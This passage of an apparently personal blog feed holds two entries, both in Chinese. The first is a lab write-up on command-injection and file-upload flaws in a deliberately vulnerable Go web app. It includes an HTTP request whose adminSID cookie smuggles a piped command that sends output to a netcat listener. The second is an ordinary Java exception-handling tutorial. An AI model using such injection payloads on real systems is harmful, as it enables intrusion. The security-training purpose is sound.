      "summary": "Go语言常见漏洞\n命令注入\n\nGitHub - Hardw01f/Vulnerability-goapp: Web application build Golang with Vulnerability\n\n这里能看到执行命令的exec.Command，命令通过拼接传入，所以可以利用管道符，把命令拼在后面。\nimage-20240923104010179...",
      "content_html": "\n<h2>命令注入</h2>\n<blockquote>\n<p><a href=\"https://github.com/Hardw01f/Vulnerability-goapp\" target=\"_blank\" rel=\"noopener noreferrer\">GitHub - Hardw01f/Vulnerability-goapp: Web application build Golang with Vulnerability</a></p>\n</blockquote>\n<p>这里能看到执行命令的<code>exec.Command</code>，命令通过拼接传入，所以可以利用管道符，把命令拼在后面。</p>\n<figure><figcaption>image-20240923104010179</figcaption></figure>\n<p>对这个函数查找所有引用，这里能看到，函数取cookie中的<code>adminSID=</code> 字段值，进行拼接</p>\n<figure><figcaption>image-20240923104059068</figcaption></figure>\n<p>接着查找所有引用，就找到了这个监听，从这里传入命令</p>\n<figure><figcaption>image-20240923104207504</figcaption></figure>\n<div class=\"language-http\" data-ext=\"http\" data-title=\"http\"><pre class=\"language-http\"><code><span class=\"token request-line\"><span class=\"token method property\">GET</span> <span class=\"token request-target url\">/adminusers</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate, br</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Cookie</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">UserName=\"Amuro Ray\"; SessionID=UlgtNzgtMkBFRlNGLmNvbQ==; UserID=1; adminSID=abcs'|whoami|nc 127.0.0.1 1234|echo '</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">DNT</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">localhost:9090</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Sec-Fetch-Dest</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">document</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Sec-Fetch-Mode</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">navigate</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Sec-Fetch-Site</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">none</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Sec-Fetch-User</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">?1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">sec-ch-ua</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Microsoft Edge\";v=\"122\"</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">sec-ch-ua-mobile</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">?0</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">sec-ch-ua-platform</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">\"Windows\"</span></span>\n\n\n</code></pre></div><figure><figcaption>image-20240923152011511</figcaption></figure>\n<h2>文件上传</h2>\n<blockquote>\n<p><a href=\"https://github.com/Hardw01f/Vulnerability-goapp\" target=\"_blank\" rel=\"noopener noreferrer\">GitHub - Hardw01f/Vulnerability-goapp: Web application build Golang with Vulnerability</a></p>\n</blockquote>\n<p><code>pkg/image/imageUploader.go</code> ，这里保存文件，路径是拼接的，且没有检验后缀</p>\n<figure><figcaption>image-20240923160617852</figcaption></figure>\n<div class=\"language-http\" data-ext=\"http\" data-title=\"http\"><pre class=\"language-http\"><code><span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/profile/edit/upload</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">172.31.13.26:9090</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">217</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Origin</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://172.31.13.26:9090</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">DNT</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">multipart/form-data; boundary=</span></span></code></pre></div>",
      "date_published": "2024-09-23T14:55:09.000Z",
      "date_modified": "2024-11-13T10:11:39.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "4-异常处理",
      "url": "https://echo0d.github.io/DailyNotes/develop/Java/4_Exception.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/Java/4_Exception.html",
      "summary": "4-异常处理\nJava的异常\n调用方如何获知调用失败的信息？有两种方法：\n方法一：约定返回错误码。\n例如，处理一个文件，如果返回0，表示成功，返回其他整数，表示约定的错误码：\n因为使用int类型的错误码，想要处理就非常麻烦。这种方式常见于底层C函数。\n方法二：在语言层面上提供一个异常处理机制。\nJava内置了一套异常处理机制，总是使用异常来表示错误。\n...",
      "content_html": "\n<h2>Java的异常</h2>\n<p>调用方如何获知调用失败的信息？有两种方法：</p>\n<p>方法一：约定返回错误码。</p>\n<p>例如，处理一个文件，如果返回<code>0</code>，表示成功，返回其他整数，表示约定的错误码：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">int</span> code <span class=\"token operator\">=</span> <span class=\"token function\">processFile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"C:\\\\test.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>code <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// ok:</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// error:</span>\n    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span>\n        <span class=\"token comment\">// file not found:</span>\n    <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span>\n        <span class=\"token comment\">// no read permission:</span>\n    <span class=\"token keyword\">default</span><span class=\"token operator\">:</span>\n        <span class=\"token comment\">// unknown error:</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>因为使用<code>int</code>类型的错误码，想要处理就非常麻烦。这种方式常见于底层C函数。</p>\n<p>方法二：在语言层面上提供一个异常处理机制。</p>\n<p>Java内置了一套异常处理机制，总是使用异常来表示错误。</p>\n<p>异常是一种<code>class</code>，因此它本身带有类型信息。异常可以在任何地方抛出，但只需要在上层捕获，这样就和方法调用分离了：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> <span class=\"token function\">processFile</span><span class=\"token punctuation\">(</span>“<span class=\"token class-name\">C</span><span class=\"token operator\">:</span>\\\\test<span class=\"token punctuation\">.</span>txt”<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// ok:</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">FileNotFoundException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// file not found:</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">SecurityException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// no read permission:</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// io error:</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// other error:</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>因为Java的异常是<code>class</code>，它的继承关系如下：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>                     ┌───────────┐\n                     │  Object   │\n                     └───────────┘\n                           ▲\n                           │\n                     ┌───────────┐\n                     │ Throwable │\n                     └───────────┘\n                           ▲\n                 ┌─────────┴─────────┐\n                 │                   │\n           ┌───────────┐       ┌───────────┐\n           │   Error   │       │ Exception │\n           └───────────┘       └───────────┘\n                 ▲                   ▲\n         ┌───────┘              ┌────┴──────────┐\n         │                      │               │\n┌─────────────────┐    ┌─────────────────┐┌───────────┐\n│OutOfMemoryError │... │RuntimeException ││IOException│...\n└─────────────────┘    └─────────────────┘└───────────┘\n                                ▲\n                    ┌───────────┴─────────────┐\n                    │                         │\n         ┌─────────────────────┐ ┌─────────────────────────┐\n         │NullPointerException │ │IllegalArgumentException │...\n         └─────────────────────┘ └─────────────────────────┘\n</code></pre></div><p>从继承关系可知：<code>Throwable</code>是异常体系的根，它继承自<code>Object</code>。<code>Throwable</code>有两个体系：<code>Error</code>和<code>Exception</code>，<code>Error</code>表示严重的错误，程序对此一般无能为力，例如：</p>\n<ul>\n<li><code>OutOfMemoryError</code>：内存耗尽</li>\n<li><code>NoClassDefFoundError</code>：无法加载某个Class</li>\n<li><code>StackOverflowError</code>：栈溢出</li>\n</ul>\n<p>而<code>Exception</code>则是运行时的错误，它可以被捕获并处理。</p>\n<p>某些异常是应用程序逻辑处理的一部分，应该捕获并处理。例如：</p>\n<ul>\n<li><code>NumberFormatException</code>：数值类型的格式错误</li>\n<li><code>FileNotFoundException</code>：未找到文件</li>\n<li><code>SocketException</code>：读取网络失败</li>\n</ul>\n<p>还有一些异常是程序逻辑编写不对造成的，应该修复程序本身。例如：</p>\n<ul>\n<li><code>NullPointerException</code>：对某个<code>null</code>的对象调用方法或字段</li>\n<li><code>IndexOutOfBoundsException</code>：数组索引越界</li>\n</ul>\n<p><code>Exception</code>又分为两大类：</p>\n<ol>\n<li><code>RuntimeException</code>以及它的子类；</li>\n<li>非<code>RuntimeException</code>（包括<code>IOException</code>、<code>ReflectiveOperationException</code>等等）</li>\n</ol>\n<p>Java规定：</p>\n<ul>\n<li>必须捕获的异常，包括<code>Exception</code>及其子类，但不包括<code>RuntimeException</code>及其子类，这种类型的异常称为Checked Exception。</li>\n<li>不需要捕获的异常，包括<code>Error</code>及其子类，<code>RuntimeException</code>及其子类。</li>\n</ul>\n<h2>捕获异常</h2>\n<p>捕获异常使用<code>try...catch</code>语句，把可能发生异常的代码放到<code>try {...}</code>中，然后使用<code>catch</code>捕获对应的<code>Exception</code>及其子类：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// try...catch</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">UnsupportedEncodingException</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Arrays</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bs <span class=\"token operator\">=</span> <span class=\"token function\">toGBK</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"中文\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Arrays</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span>bs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">static</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token function\">toGBK</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// 用指定编码转换String为byte[]:</span>\n            <span class=\"token keyword\">return</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"GBK\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">UnsupportedEncodingException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// 如果系统不支持GBK编码，会捕获到UnsupportedEncodingException:</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 打印异常信息</span>\n            <span class=\"token keyword\">return</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 尝试使用用默认编码</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>如果我们不捕获<code>UnsupportedEncodingException</code>，会出现编译失败的问题：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// try...catch</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">UnsupportedEncodingException</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Arrays</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bs <span class=\"token operator\">=</span> <span class=\"token function\">toGBK</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"中文\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Arrays</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span>bs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">static</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token function\">toGBK</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"GBK\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>编译器会报错，错误信息类似：unreported exception UnsupportedEncodingException; must be caught or declared to be thrown，并且准确地指出需要捕获的语句是<code>return s.getBytes(\"GBK\");</code>。意思是说，像<code>UnsupportedEncodingException</code>这样的Checked Exception，必须被捕获。</p>\n<p>这是因为<code>String.getBytes(String)</code>方法定义是：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> charsetName<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">UnsupportedEncodingException</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>在方法定义的时候，使用<code>throws Xxx</code>表示该方法可能抛出的异常类型。调用方在调用的时候，必须强制捕获这些异常，否则编译器会报错。</p>\n<h3>多catch语句</h3>\n<p>可以使用多个<code>catch</code>语句，每个<code>catch</code>分别捕获对应的<code>Exception</code>及其子类。JVM在捕获到异常后，会从上到下匹配<code>catch</code>语句，匹配到某个<code>catch</code>后，执行<code>catch</code>代码块，然后<em>不再</em>继续匹配。</p>\n<p>简单地说就是：多个<code>catch</code>语句只有一个能被执行。例如：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">process1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">process2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">process3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">NumberFormatException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>存在多个<code>catch</code>的时候，<code>catch</code>的顺序非常重要：子类必须写在前面。例如：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">process1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">process2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">process3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"IO error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">UnsupportedEncodingException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// 永远捕获不到</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bad encoding\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>对于上面的代码，<code>UnsupportedEncodingException</code>异常是永远捕获不到的，因为它是<code>IOException</code>的子类。当抛出<code>UnsupportedEncodingException</code>异常时，会被<code>catch (IOException e) { ... }</code>捕获并执行。</p>\n<p>因此，正确的写法是把子类放到前面：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">process1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">process2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">process3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">UnsupportedEncodingException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bad encoding\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"IO error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>finally语句</h3>\n<p>无论是否有异常发生，如果我们都希望执行一些语句，例如清理工作，怎么写？</p>\n<p>可以把执行语句写若干遍：正常执行的放到<code>try</code>中，每个<code>catch</code>再写一遍。例如：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">process1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">process2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">process3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"END\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">UnsupportedEncodingException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bad encoding\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"END\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"IO error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"END\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>上述代码无论是否发生异常，都会执行<code>System.out.println(\"END\");</code>这条语句。</p>\n<p>那么如何消除这些重复的代码？Java的<code>try ... 